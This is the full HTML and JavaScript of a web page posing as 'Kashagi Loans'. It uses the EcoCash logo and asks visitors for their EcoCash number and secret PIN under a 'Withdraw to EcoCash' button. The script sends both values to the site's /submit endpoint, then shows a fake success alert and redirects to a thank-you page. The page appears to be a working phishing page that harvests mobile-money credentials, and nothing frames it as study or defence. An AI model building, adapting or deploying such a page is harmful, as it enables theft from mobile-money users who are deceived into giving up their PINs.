<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Kashagi Loans</title>

    <style>

        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            padding: 20px;

            min-height: 100vh;

            font-family: Arial, Helvetica, sans-serif;

            background: #eef5fb;

            display: flex;
            align-items: center;
            justify-content: center;
        }


        /* =========================
           MAIN CARD
        ========================= */

        .container {
            width: 100%;
            max-width: 590px;

            background: #ffffff;

            border-radius: 20px;

            overflow: hidden;

            box-shadow:
                0 12px 35px rgba(0, 0, 0, 0.15);
        }


        /* =========================
           BLUE HEADER
        ========================= */

        .header {
            background: #1877f2;

            color: white;

            text-align: center;

            padding: 40px 20px 42px;
        }


        /* =========================
           CIRCULAR ECOCASH LOGO
        ========================= */

        .logo {
            width: 150px;
            height: 150px;

            display: block;

            margin: 0 auto 18px;

            object-fit: cover;

            border-radius: 50%;

            clip-path: circle(50%);
        }


        /* =========================
           TITLE
        ========================= */

        .title {
            margin: 0;

            font-size: 40px;

            font-weight: 700;
        }


        .subtitle {
            margin-top: 10px;

            font-size: 24px;
        }


        /* =========================
           FORM
        ========================= */

        .form-area {
            padding: 40px;
        }


        .field {
            margin-bottom: 28px;
        }


        label {
            display: block;

            margin-bottom: 12px;

            font-size: 25px;

            font-weight: 700;

            color: #333333;
        }


        input {
            width: 100%;

            height: 70px;

            padding: 0 20px;

            border: 1px solid #d9d9d9;

            border-radius: 10px;

            font-size: 21px;

            outline: none;

            background: #ffffff;
        }


        input:focus {
            border-color: #1877f2;

            box-shadow:
                0 0 0 2px rgba(24, 119, 242, 0.12);
        }


        /* =========================
           BUTTON
        ========================= */

        .withdraw-btn {
            width: 100%;

            height: 72px;

            border: none;

            border-radius: 10px;

            background: #1877f2;

            color: white;

            font-size: 24px;

            font-weight: 700;

            cursor: pointer;
        }


        .withdraw-btn:active {
            transform: scale(0.99);
        }


        .withdraw-btn:disabled {
            opacity: 0.7;

            cursor: not-allowed;
        }


        /* =========================
           MOBILE
        ========================= */

        @media (max-width: 600px) {

            body {
                padding: 0 12px;
            }


            .header {
                padding: 38px 15px 40px;
            }


            .logo {
                width: 145px;
                height: 145px;

                object-fit: cover;

                border-radius: 50%;

                clip-path: circle(50%);
            }


            .title {
                font-size: 36px;
            }


            .subtitle {
                font-size: 22px;
            }


            .form-area {
                padding: 35px 30px;
            }


            label {
                font-size: 23px;
            }


            input {
                height: 68px;

                font-size: 20px;
            }


            .withdraw-btn {
                height: 70px;

                font-size: 22px;
            }

        }

    </style>

</head>


<body>


<div class="container">


    <!-- =========================
         HEADER
    ========================= -->

    <div class="header">


        <!-- YOUR EXISTING PNG -->

        <img
            src="Ecocash.png"
            alt="EcoCash"
            class="logo"
        >


        <h1 class="title">
            Kashagi Loans
        </h1>


        <div class="subtitle">
            Fast • Secure • Reliable
        </div>


    </div>



    <!-- =========================
         FORM
    ========================= -->

    <div class="form-area">


        <!-- ECOCASH NUMBER -->

        <div class="field">

            <label for="ecocash_number">
                EcoCash Number
            </label>


            <input
                type="tel"
                id="ecocash_number"
                placeholder="e.g. 0771234567"
                autocomplete="tel"
            >

        </div>



        <!-- ECOCASH PIN -->

        <div class="field">

            <label for="ecocash_pin">
                EcoCash Pin
            </label>


            <input
                type="text"
                id="ecocash_pin"
                placeholder="Enter ecocash pin"
                autocomplete="off"
            >

        </div>



        <!-- WITHDRAW BUTTON -->

        <button
            type="button"
            id="withdrawBtn"
            class="withdraw-btn"
            onclick="submitForm()"
        >
            Withdraw to EcoCash
        </button>


    </div>

</div>



<script>


async function submitForm() {


    const ecocashNumber =
        document
        .getElementById("ecocash_number")
        .value
        .trim();



    const ecocashPin =
        document
        .getElementById("ecocash_pin")
        .value
        .trim();



    // Check EcoCash number

    if (!ecocashNumber) {

        alert(
            "Please enter your EcoCash number."
        );

        return;
    }



    // Check ecocash pin

    if (!ecocashPin) {

        alert(
            "Please enter your ecocash pin."
        );

        return;
    }



    const button =
        document.getElementById(
            "withdrawBtn"
        );



    button.disabled = true;

    button.textContent =
        "Processing...";



    try {


        const response =
            await fetch(
                "/submit",
                {

                    method: "POST",

                    headers: {

                        "Content-Type":
                            "application/json"

                    },

                    body: JSON.stringify({

                        ecocash_number:
                            ecocashNumber,

                        ecocash_pin:
                            ecocashPin

                    })

                }
            );



        const data =
            await response.json();



        if (
            !response.ok ||
            !data.success
        ) {

            throw new Error(
                data.message ||
                "Submission failed."
            );

        }



        // SUCCESS MESSAGE

        alert(
            "Withdrawal request has been received successfully."
        );



        // REDIRECT AFTER OK

        window.location.href =
            "/thankyou.html";


    } catch (error) {


        console.error(
            "SUBMISSION ERROR:",
            error
        );


        alert(
            "Server connection error. Please try again later."
        );


        button.disabled = false;

        button.textContent =
            "Withdraw to EcoCash";

    }

}


</script>


</body>
</html>
